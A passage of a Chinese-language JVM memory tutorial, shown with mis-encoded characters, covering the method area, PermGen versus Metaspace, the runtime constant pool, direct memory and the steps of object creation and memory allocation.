<li><strong>å¸¸é‡</strong>ï¼šå­—ç¬¦ä¸²å¸¸é‡ã€æ•°å­—å¸¸é‡ç­‰ï¼ˆè¿è¡Œæ—¶å¸¸é‡æ± ï¼‰</li>
<li><strong>é™æ€å˜é‡</strong>ï¼šç±»å˜é‡ï¼ˆstaticä¿®é¥°çš„å˜é‡ï¼‰</li>
<li><strong>JITç¼–è¯‘åçš„ä»£ç </strong>ï¼šè¢«JITç¼–è¯‘å™¨ç¼–è¯‘åçš„æœºå™¨ç </li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodAreaExample</span> {
    <span class="hljs-comment">// é™æ€å˜é‡ â†’ æ–¹æ³•åŒº</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-variable">staticVar</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
    
    <span class="hljs-comment">// ç±»ä¿¡æ¯ â†’ æ–¹æ³•åŒº</span>
    <span class="hljs-comment">// - ç±»çš„åç§°ã€çˆ¶ç±»ã€æ–¹æ³•ã€å­—æ®µç­‰ä¿¡æ¯éƒ½å­˜å‚¨åœ¨æ–¹æ³•åŒº</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å­—ç¬¦ä¸²å¸¸é‡ â†’ æ–¹æ³•åŒºï¼ˆè¿è¡Œæ—¶å¸¸é‡æ± ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;  <span class="hljs-comment">// "Hello"å­—ç¬¦ä¸²åœ¨æ–¹æ³•åŒºçš„å¸¸é‡æ± ä¸­</span>
    }
}
</code></pre>
<h4 data-id="heading-47">7.3 JDK 8ä¹‹å‰ï¼šæ°¸ä¹…ä»£ï¼ˆPermGenï¼‰</h4>
<p><strong>æ°¸ä¹…ä»£ï¼ˆPermanent Generationï¼‰çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å †çš„ä¸€éƒ¨åˆ†ï¼Œä½¿ç”¨å †å†…å­˜</li>
<li>å¤§å°å›ºå®šï¼Œéœ€è¦é¢„å…ˆè®¾ç½®</li>
<li>å®¹æ˜“å‘ç”Ÿå†…å­˜æº¢å‡º</li>
</ul>
<p><strong>å¤§å°è®¾ç½®ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">-XX:<span class="hljs-attr">PermSize</span>=<span class="hljs-number">64</span>m        // åˆå§‹æ°¸ä¹…ä»£å¤§å°
-XX:<span class="hljs-attr">MaxPermSize</span>=<span class="hljs-number">256</span>m    // æœ€å¤§æ°¸ä¹…ä»£å¤§å°
</code></pre>
<p><strong>å¼‚å¸¸ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">OutOfMemoryError: PermGen space</span>
</code></pre>
<p><strong>äº§ç”ŸåŸå› ï¼š</strong></p>
<ol>
<li>ç±»åŠ è½½è¿‡å¤š</li>
<li>å­—ç¬¦ä¸²å¸¸é‡è¿‡å¤šï¼ˆString.intern()ï¼‰</li>
<li>æ°¸ä¹…ä»£å¤§å°è®¾ç½®è¿‡å°</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PermGenOOM</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// ä¸æ–­åŠ è½½ç±»ï¼Œå¯èƒ½å¯¼è‡´æ°¸ä¹…ä»£æº¢å‡º</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">100000</span>; i++) {
            <span class="hljs-comment">// åŠ¨æ€åŠ è½½ç±»</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-48">7.4 JDK 8åŠä¹‹åï¼šå…ƒç©ºé—´ï¼ˆMetaspaceï¼‰</h4>
<p><strong>å…ƒç©ºé—´ï¼ˆMetaspaceï¼‰çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨æœ¬åœ°å†…å­˜ï¼ˆNative Memoryï¼‰ï¼Œä¸åœ¨å †ä¸­</li>
<li>å¤§å°åŠ¨æ€è°ƒæ•´</li>
<li>ä¸å†å—JVMå †å†…å­˜é™åˆ¶</li>
<li>åªæœ‰è¾¾åˆ°MaxMetaspaceSizeæ—¶æ‰ä¼šæŠ›å‡ºå¼‚å¸¸</li>
</ul>
<p><strong>å¤§å°è®¾ç½®ï¼š</strong></p>
<pre><code class="hljs language-ini" lang="ini">-XX:<span class="hljs-attr">MetaspaceSize</span>=<span class="hljs-number">64</span>m        // åˆå§‹å…ƒç©ºé—´å¤§å°
-XX:<span class="hljs-attr">MaxMetaspaceSize</span>=<span class="hljs-number">256</span>m    // æœ€å¤§å…ƒç©ºé—´å¤§å°ï¼ˆé»˜è®¤æ— é™åˆ¶ï¼‰
</code></pre>
<p><strong>å¼‚å¸¸ï¼š</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">OutOfMemoryError: Metaspace</span>
</code></pre>
<p><strong>äº§ç”ŸåŸå› ï¼š</strong></p>
<ol>
<li>ç±»åŠ è½½è¿‡å¤š</li>
<li>å…ƒæ•°æ®è¿‡å¤š</li>
<li>MaxMetaspaceSizeè®¾ç½®è¿‡å°</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetaspaceOOM</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// ä¸æ–­ç”ŸæˆåŠ¨æ€ç±»ï¼Œå¯èƒ½å¯¼è‡´å…ƒç©ºé—´æº¢å‡º</span>
        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
            <span class="hljs-comment">// åŠ¨æ€åˆ›å»ºç±»</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-49">7.5 æ°¸ä¹…ä»£ä¸å…ƒç©ºé—´çš„åŒºåˆ«</h4>








































<table><thead><tr><th>ç‰¹æ€§</th><th>æ°¸ä¹…ä»£ï¼ˆPermGenï¼‰</th><th>å…ƒç©ºé—´ï¼ˆMetaspaceï¼‰</th></tr></thead><tbody><tr><td><strong>å­˜å‚¨ä½ç½®</strong></td><td>å †å†…å­˜ä¸­</td><td>æœ¬åœ°å†…å­˜ï¼ˆNative Memoryï¼‰</td></tr><tr><td><strong>å¤§å°é™åˆ¶</strong></td><td>å›ºå®šå¤§å°ï¼Œéœ€è¦é¢„å…ˆè®¾ç½®</td><td>åŠ¨æ€è°ƒæ•´ï¼Œé»˜è®¤æ— é™åˆ¶</td></tr><tr><td><strong>å†…å­˜ç®¡ç†</strong></td><td>å—JVMå †å†…å­˜é™åˆ¶</td><td>ä¸å—JVMå †å†…å­˜é™åˆ¶</td></tr><tr><td><strong>GCå½±å“</strong></td><td>GCæ•ˆç‡è¾ƒä½</td><td>GCæ•ˆç‡è¾ƒé«˜</td></tr><tr><td><strong>æº¢å‡ºé—®é¢˜</strong></td><td>å®¹æ˜“æº¢å‡º</td><td>ç›¸å¯¹ä¸å®¹æ˜“æº¢å‡º</td></tr><tr><td><strong>é€‚ç”¨ç‰ˆæœ¬</strong></td><td>JDK 8ä¹‹å‰</td><td>JDK 8åŠä¹‹å</td></tr></tbody></table>
<p><strong>ä¸ºä»€ä¹ˆæ”¹ç”¨å…ƒç©ºé—´ï¼Ÿ</strong></p>
<ol>
<li><strong>æé«˜GCæ•ˆç‡</strong>ï¼šæ°¸ä¹…ä»£çš„GCæ•ˆç‡è¾ƒä½ï¼Œå…ƒç©ºé—´çš„GCæ•ˆç‡æ›´é«˜</li>
<li><strong>é¿å…æº¢å‡º</strong>ï¼šæ°¸ä¹…ä»£å›ºå®šå¤§å°å®¹æ˜“æº¢å‡ºï¼Œå…ƒç©ºé—´åŠ¨æ€è°ƒæ•´</li>
<li><strong>æ›´å¥½çš„å†…å­˜ç®¡ç†</strong>ï¼šå…ƒç©ºé—´ä½¿ç”¨æœ¬åœ°å†…å­˜ï¼Œç®¡ç†æ›´çµæ´»</li>
<li><strong>ä¸HotSpotåˆ†ç¦»</strong>ï¼šå…ƒç©ºé—´çš„å®ç°ä¸HotSpotåˆ†ç¦»ï¼Œæ›´å®¹æ˜“ä¼˜åŒ–</li>
</ol>
<h4 data-id="heading-50">7.6 æ–¹æ³•åŒºçš„å›æ”¶</h4>
<p><strong>æ–¹æ³•åŒºçš„å›æ”¶ä¸»è¦åŒ…æ‹¬ï¼š</strong></p>
<ol>
<li>
<p><strong>å¸¸é‡æ± çš„å›æ”¶</strong></p>
<ul>
<li>å¸¸é‡æ± ä¸­çš„å¸¸é‡å¦‚æœæ²¡æœ‰è¢«å¼•ç”¨ï¼Œå¯ä»¥è¢«å›æ”¶</li>
<li>å­—ç¬¦ä¸²å¸¸é‡çš„å›æ”¶</li>
</ul>
</li>
<li>
<p><strong>ç±»å‹çš„å¸è½½</strong></p>
<ul>
<li>æ¡ä»¶éå¸¸è‹›åˆ»</li>
<li>éœ€è¦æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶ï¼š
<ul>
<li>è¯¥ç±»çš„æ‰€æœ‰å®ä¾‹éƒ½å·²è¢«å›æ”¶</li>
<li>åŠ è½½è¯¥ç±»çš„ClassLoaderå·²è¢«å›æ”¶</li>
<li>è¯¥ç±»å¯¹åº”çš„java.lang.Classå¯¹è±¡æ²¡æœ‰è¢«å¼•ç”¨</li>
</ul>
</li>
</ul>
</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MethodAreaGC</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å­—ç¬¦ä¸²å¸¸é‡å¯èƒ½è¢«å›æ”¶ï¼ˆå¦‚æœæ²¡æœ‰è¢«å¼•ç”¨ï¼‰</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;  <span class="hljs-comment">// åœ¨å¸¸é‡æ± ä¸­</span>
        <span class="hljs-comment">// å¦‚æœstr1ä¸å†è¢«å¼•ç”¨ï¼Œå¸¸é‡"Hello"å¯èƒ½è¢«å›æ”¶</span>
    }
}
</code></pre>
<h3 data-id="heading-51">8. è¿è¡Œæ—¶å¸¸é‡æ± ï¼ˆRuntime Constant Poolï¼‰</h3>
<h4 data-id="heading-52">8.1 ä½œç”¨</h4>
<p>è¿è¡Œæ—¶å¸¸é‡æ± æ˜¯æ–¹æ³•åŒºçš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºå­˜å‚¨ç¼–è¯‘æœŸç”Ÿæˆçš„å­—é¢é‡å’Œç¬¦å·å¼•ç”¨ã€‚</p>
<p><strong>å­˜å‚¨å†…å®¹ï¼š</strong></p>
<ul>
<li><strong>å­—é¢é‡</strong>ï¼šå­—ç¬¦ä¸²ã€æ•°å­—ç­‰å¸¸é‡å€¼</li>
<li><strong>ç¬¦å·å¼•ç”¨</strong>ï¼šç±»åã€æ–¹æ³•åã€å­—æ®µåç­‰ç¬¦å·</li>
<li><strong>ç›´æ¥å¼•ç”¨</strong>ï¼šç±»åŠ è½½åï¼Œç¬¦å·å¼•ç”¨è¢«è§£æä¸ºç›´æ¥å¼•ç”¨</li>
</ul>
<h4 data-id="heading-53">8.2 å¸¸é‡æ± çš„å†…å®¹</h4>
<p><strong>1. å­—é¢é‡</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstantPool</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;    <span class="hljs-comment">// å­—é¢é‡"Hello"åœ¨å¸¸é‡æ± ä¸­</span>
        <span class="hljs-type">int</span> <span class="hljs-variable">num</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;           <span class="hljs-comment">// æ•°å­—å­—é¢é‡</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;     <span class="hljs-comment">// å¸ƒå°”å­—é¢é‡</span>
    }
}
</code></pre>
<p><strong>2. ç¬¦å·å¼•ç”¨</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç¬¦å·å¼•ç”¨ï¼šç±»åã€æ–¹æ³•åã€å­—æ®µåç­‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SymbolReference</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// ç¬¦å·å¼•ç”¨ï¼šç±»åã€æ–¹æ³•å</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// Objectæ˜¯ç¬¦å·å¼•ç”¨ï¼Œç±»åŠ è½½åè§£æä¸ºç›´æ¥å¼•ç”¨</span>
        obj.toString();             <span class="hljs-comment">// toStringæ˜¯ç¬¦å·å¼•ç”¨ï¼Œè§£æä¸ºç›´æ¥å¼•ç”¨</span>
    }
}
</code></pre>
<p><strong>3. ç›´æ¥å¼•ç”¨</strong></p>
<p>ç±»åŠ è½½åï¼Œç¬¦å·å¼•ç”¨è¢«è§£æä¸ºç›´æ¥å¼•ç”¨ï¼ˆæŒ‡å‘å®é™…çš„å†…å­˜åœ°å€ï¼‰ã€‚</p>
<h4 data-id="heading-54">8.3 ä¸æ–¹æ³•åŒºçš„å…³ç³»</h4>
<p><strong>JDKç‰ˆæœ¬å·®å¼‚ï¼š</strong></p>
<ul>
<li><strong>JDK 8ä¹‹å‰</strong>ï¼šè¿è¡Œæ—¶å¸¸é‡æ± æ˜¯æ–¹æ³•åŒºï¼ˆæ°¸ä¹…ä»£ï¼‰çš„ä¸€éƒ¨åˆ†</li>
<li><strong>JDK 8åŠä¹‹å</strong>ï¼šè¿è¡Œæ—¶å¸¸é‡æ± æ˜¯å †çš„ä¸€éƒ¨åˆ†ï¼ˆå­—ç¬¦ä¸²å¸¸é‡æ± ç§»åˆ°å †ä¸­ï¼‰</li>
</ul>
<p><strong>å˜åŒ–è¯´æ˜ï¼š</strong></p>
<p>JDK 8å°†å­—ç¬¦ä¸²å¸¸é‡æ± ä»æ°¸ä¹…ä»£ç§»åˆ°äº†å †ä¸­ï¼Œè¿™æ ·ï¼š</p>
<ul>
<li>å­—ç¬¦ä¸²å¯ä»¥è¢«GCå›æ”¶</li>
<li>å‡å°‘æ°¸ä¹…ä»£/å…ƒç©ºé—´çš„å‹åŠ›</li>
<li>æé«˜GCæ•ˆç‡</li>
</ul>
<h4 data-id="heading-55">8.4 å¸¸é‡æ± çš„å›æ”¶</h4>
<p><strong>å¸¸é‡æ± ä¸­çš„å¸¸é‡å¯ä»¥è¢«å›æ”¶ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConstantPoolGC</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;  <span class="hljs-comment">// "Hello"åœ¨å¸¸é‡æ± ä¸­</span>
        str1 = <span class="hljs-literal">null</span>;            <span class="hljs-comment">// str1ä¸å†å¼•ç”¨"Hello"</span>
        <span class="hljs-comment">// å¦‚æœæ²¡æœ‰å…¶ä»–åœ°æ–¹å¼•ç”¨"Hello"ï¼Œå®ƒå¯èƒ½è¢«GCå›æ”¶</span>
    }
}
</code></pre>
<p><strong>String.intern()æ–¹æ³•ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StringIntern</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">str1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(<span class="hljs-string">"Hello"</span>);  <span class="hljs-comment">// å¯¹è±¡åœ¨å †ä¸­</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">str2</span> <span class="hljs-operator">=</span> str1.intern();        <span class="hljs-comment">// å°†å­—ç¬¦ä¸²æ”¾å…¥å¸¸é‡æ± </span>
        
        <span class="hljs-type">String</span> <span class="hljs-variable">str3</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Hello"</span>;              <span class="hljs-comment">// ä»å¸¸é‡æ± è·å–</span>
        System.out.println(str2 == str3);   <span class="hljs-comment">// trueï¼ŒåŒä¸€ä¸ªå¯¹è±¡</span>
    }
}
</code></pre>
<h3 data-id="heading-56">9. ç›´æ¥å†…å­˜ï¼ˆDirect Memoryï¼‰</h3>
<h4 data-id="heading-57">9.1 ä½œç”¨</h4>
<p>ç›´æ¥å†…å­˜æ˜¯å †å¤–å†…å­˜ï¼Œä¸å±äºJVMè¿è¡Œæ—¶æ•°æ®åŒºï¼Œä¹Ÿä¸å—JVMå †å†…å­˜é™åˆ¶ã€‚</p>
<p><strong>ä¸»è¦ç”¨é€”ï¼š</strong></p>
<ul>
<li>NIOï¼ˆNew I/Oï¼‰ä½¿ç”¨</li>
<li>æé«˜I/Oæ€§èƒ½</li>
<li>é¿å…Javaå †å’ŒNativeå †ä¹‹é—´çš„æ•°æ®å¤åˆ¶</li>
</ul>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ç›´æ¥å†…å­˜ï¼Ÿ</strong></p>
<p>ä¼ ç»ŸI/Oéœ€è¦å°†æ•°æ®ä»å†…æ ¸ç©ºé—´å¤åˆ¶åˆ°ç”¨æˆ·ç©ºé—´ï¼ˆJavaå †ï¼‰ï¼Œç„¶åJavaç¨‹åºæ‰èƒ½è®¿é—®ã€‚ä½¿ç”¨ç›´æ¥å†…å­˜å¯ä»¥ï¼š</p>
<ul>
<li>ç›´æ¥åœ¨å †å¤–å†…å­˜ä¸­æ“ä½œæ•°æ®</li>
<li>å‡å°‘æ•°æ®å¤åˆ¶æ¬¡æ•°</li>
<li>æé«˜I/Oæ€§èƒ½</li>
</ul>
<h4 data-id="heading-58">9.2 ç›´æ¥å†…å­˜çš„ç‰¹ç‚¹</h4>
<ol>
<li><strong>ä¸å—JVMå †å†…å­˜é™åˆ¶</strong>ï¼šç›´æ¥å†…å­˜ä¸åœ¨å †ä¸­ï¼Œä¸å—-Xmxé™åˆ¶</li>
<li><strong>å—æ“ä½œç³»ç»Ÿå†…å­˜é™åˆ¶</strong>ï¼šå—ç‰©ç†å†…å­˜å’Œæ“ä½œç³»ç»Ÿé™åˆ¶</li>
<li><strong>åˆ†é…å’Œå›æ”¶æˆæœ¬è¾ƒé«˜</strong>ï¼šåˆ†é…å’Œå›æ”¶éœ€è¦è°ƒç”¨ç³»ç»Ÿå‡½æ•°</li>
</ol>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> java.nio.ByteBuffer;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DirectMemoryExample</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">useDirectMemory</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// åˆ†é…ç›´æ¥å†…å­˜</span>
        <span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> ByteBuffer.allocateDirect(<span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);  <span class="hljs-comment">// 1MBç›´æ¥å†…å­˜</span>
        
        <span class="hljs-comment">// ä½¿ç”¨ç›´æ¥å†…å­˜è¿›è¡ŒI/Oæ“ä½œ</span>
        <span class="hljs-comment">// ... I/Oæ“ä½œ ...</span>
        
        <span class="hljs-comment">// ç›´æ¥å†…å­˜ç”±Full GCæˆ–System.gc()å›æ”¶</span>
    }
}
</code></pre>
<h4 data-id="heading-59">9.3 ç›´æ¥å†…å­˜çš„åˆ†é…</h4>
<p><strong>åˆ†é…æ–¹å¼ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ–¹å¼1ï¼šé€šè¿‡ByteBufferåˆ†é…</span>
<span class="hljs-type">ByteBuffer</span> <span class="hljs-variable">buffer</span> <span class="hljs-operator">=</span> ByteBuffer.allocateDirect(<span class="hljs-number">1024</span>);

<span class="hljs-comment">// æ–¹å¼2ï¼šåº•å±‚è°ƒç”¨Unsafe.allocateMemory()</span>
<span class="hljs-comment">// Unsafe.allocateMemory(size);</span>
</code></pre>
<p><strong>åº•å±‚å®ç°ï¼š</strong></p>
<ul>
<li>ç›´æ¥å†…å­˜çš„åˆ†é…é€šè¿‡è°ƒç”¨Unsafe.allocateMemory()å®ç°</li>
<li>è¿™æ˜¯æœ¬åœ°æ–¹æ³•ï¼Œç›´æ¥æ“ä½œæ“ä½œç³»ç»Ÿå†…å­˜</li>
</ul>
<h4 data-id="heading-60">9.4 ç›´æ¥å†…å­˜çš„å›æ”¶</h4>
<p><strong>å›æ”¶æœºåˆ¶ï¼š</strong></p>
<ol>
<li><strong>Full GCæ—¶å›æ”¶</strong>ï¼šFull GCä¼šå›æ”¶ç›´æ¥å†…å­˜</li>
<li><strong>System.gc()è§¦å‘å›æ”¶</strong>ï¼šè°ƒç”¨System.gc()å¯èƒ½è§¦å‘ç›´æ¥å†…å­˜å›æ”¶</li>
<li><strong>Cleaneræœºåˆ¶</strong>ï¼šJDK 9ä¹‹åä½¿ç”¨Cleaneræœºåˆ¶è‡ªåŠ¨å›æ”¶</li>
</ol>
<p><strong>æ³¨æ„ï¼š</strong></p>
<ul>
<li>ç›´æ¥å†…å­˜çš„å›æ”¶ä¸å®Œå…¨å—JVMæ§åˆ¶</li>
<li>å»ºè®®ä½¿ç”¨-XX:MaxDirectMemorySizeé™åˆ¶å¤§å°</li>
</ul>
<h4 data-id="heading-61">9.5 å¼‚å¸¸</h4>
<p><strong>OutOfMemoryError: Direct buffer memory</strong></p>
<p>å½“ç›´æ¥å†…å­˜ä¸è¶³æ—¶ï¼Œä¼šæŠ›å‡ºOutOfMemoryError: Direct buffer memoryã€‚</p>
<p><strong>äº§ç”ŸåŸå› ï¼š</strong></p>
<ol>
<li>ç›´æ¥å†…å­˜ä½¿ç”¨è¿‡å¤š</li>
<li>ç›´æ¥å†…å­˜æ²¡æœ‰åŠæ—¶å›æ”¶</li>
<li>-XX:MaxDirectMemorySizeè®¾ç½®è¿‡å°</li>
</ol>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ol>
<li>å¢åŠ -XX:MaxDirectMemorySize</li>
<li>å‡å°‘ç›´æ¥å†…å­˜çš„ä½¿ç”¨</li>
<li>åŠæ—¶é‡Šæ”¾ç›´æ¥å†…å­˜</li>
</ol>
<hr/>
<h2 data-id="heading-62">ç¬¬å››éƒ¨åˆ†ï¼šå¯¹è±¡çš„åˆ›å»ºä¸å†…å­˜å¸ƒå±€ï¼ˆé‡ç‚¹ï¼‰</h2>
<h3 data-id="heading-63">10. å¯¹è±¡åˆ›å»ºçš„å®Œæ•´æµç¨‹</h3>
<h4 data-id="heading-64">10.1 å¯¹è±¡åˆ›å»ºæµç¨‹å›¾</h4>
<pre><code class="hljs language-markdown" lang="markdown">å¯¹è±¡åˆ›å»ºæµç¨‹ï¼š

<span class="hljs-bullet">1.</span> ç±»åŠ è½½æ£€æŸ¥
   â†“
<span class="hljs-bullet">2.</span> åˆ†é…å†…å­˜ (æŒ‡é’ˆç¢°æ’/ç©ºé—²åˆ—è¡¨/TLAB)
   â†“
<span class="hljs-bullet">3.</span> åˆå§‹åŒ–é›¶å€¼
   â†“
<span class="hljs-bullet">4.</span> è®¾ç½®å¯¹è±¡å¤´ (Mark Word/ç±»å‹æŒ‡é’ˆ)
   â†“
<span class="hljs-bullet">5.</span> æ‰§è¡Œæ„é€ å‡½æ•°
</code></pre>
<h4 data-id="heading-65">10.2 ç±»åŠ è½½æ£€æŸ¥</h4>
<p><strong>æ£€æŸ¥è¿‡ç¨‹ï¼š</strong></p>
<p>å½“é‡åˆ°newæŒ‡ä»¤æ—¶ï¼ŒJVMé¦–å…ˆæ£€æŸ¥ï¼š</p>
<ol>
<li>æ£€æŸ¥è¿™ä¸ªæŒ‡ä»¤çš„å‚æ•°æ˜¯å¦èƒ½åœ¨å¸¸é‡æ± ä¸­å®šä½åˆ°ç±»çš„ç¬¦å·å¼•ç”¨</li>
<li>æ£€æŸ¥è¿™ä¸ªç¬¦å·å¼•ç”¨ä»£è¡¨çš„ç±»æ˜¯å¦å·²è¢«åŠ è½½ã€è§£æå’Œåˆå§‹åŒ–</li>
</ol>
<p><strong>å¦‚æœæ²¡æœ‰åŠ è½½ï¼š</strong></p>
<p>å¦‚æœæ²¡æœ‰åŠ è½½ï¼Œåˆ™æ‰§è¡Œç±»åŠ è½½è¿‡ç¨‹ï¼ˆåŠ è½½ã€éªŒè¯ã€å‡†å¤‡ã€è§£æã€åˆå§‹åŒ–ï¼‰ã€‚</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectCreation</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">create</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// é‡åˆ°newæŒ‡ä»¤æ—¶ï¼Œå…ˆæ£€æŸ¥MyClassæ˜¯å¦å·²åŠ è½½</span>
        <span class="hljs-type">MyClass</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyClass</span>();  <span class="hljs-comment">// å¦‚æœMyClassæœªåŠ è½½ï¼Œå…ˆæ‰§è¡Œç±»åŠ è½½</span>
    }
}
</code></pre>
<h4 data-id="heading-66">10.3 åˆ†é…å†…å­˜</h4>
<p><strong>å†…å­˜åˆ†é…çš„æ–¹å¼ï¼š</strong></p>
<p><strong>1. æŒ‡é’ˆç¢°æ’ï¼ˆBump the Pointerï¼‰</strong></p>
<p>é€‚ç”¨åœºæ™¯ï¼šå †å†…å­˜è§„æ•´ï¼ˆä½¿ç”¨æ ‡è®°-æ•´ç†ç®—æ³•ï¼‰</p>
<pre><code class="hljs language-css" lang="css">æŒ‡é’ˆç¢°æ’ï¼š

<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[ç©ºé—²]</span><span class="hljs-selector-attr">[ç©ºé—²]</span>
                 â†‘æŒ‡é’ˆ

åˆ†é…åï¼š
<span class="hljs-selector-attr">[å¯¹è±¡1]</span><span class="hljs-selector-attr">[å¯¹è±¡2]</span><span class="hljs-selector-attr">[å¯¹è±¡3]</span><span class="hljs-selector-attr">[æ–°å¯¹è±¡]</span><span class="hljs-selector-attr">[ç©ºé—²]</span>
                         â†‘æŒ‡é’ˆåç§»
</code></pre>
<p><strong>2. ç©ºé—²åˆ—è¡¨ï¼ˆFree Listï¼‰</strong></p>
<p>é€‚ç”¨åœºæ™¯ï¼šå †å†…å­˜ä¸è§„æ•´ï¼ˆä½¿ç”¨æ ‡è®°-æ¸…é™¤ç®—æ³•ï¼‰</p>
<pre><code class="hljs language-ini" lang="ini">ç©ºé—²åˆ—è¡¨ï¼š

å †çŠ¶æ€: <span class="hljs-section">[å¯¹è±¡1]</span><span class="hljs-section">[ç©º]</span><span class="hljs-section">[å¯¹è±¡2]</span><span class="hljs-section">[ç©º]</span><span class="hljs-section">[å¯¹è±¡3]</span>
ç©ºé—²åˆ—è¡¨: <span class="hljs-section">[ä½ç½®1, ä½ç½®3]</span>

åˆ†é…: ä»ç©ºé—²åˆ—è¡¨ä¸­é€‰æ‹©åˆé€‚ä½ç½®

é€‚ç”¨äºå †å†…å­˜ä¸è§„æ•´
</code></pre>
<p><strong>å†…å­˜åˆ†é…å¹¶å‘é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼š</strong></p>
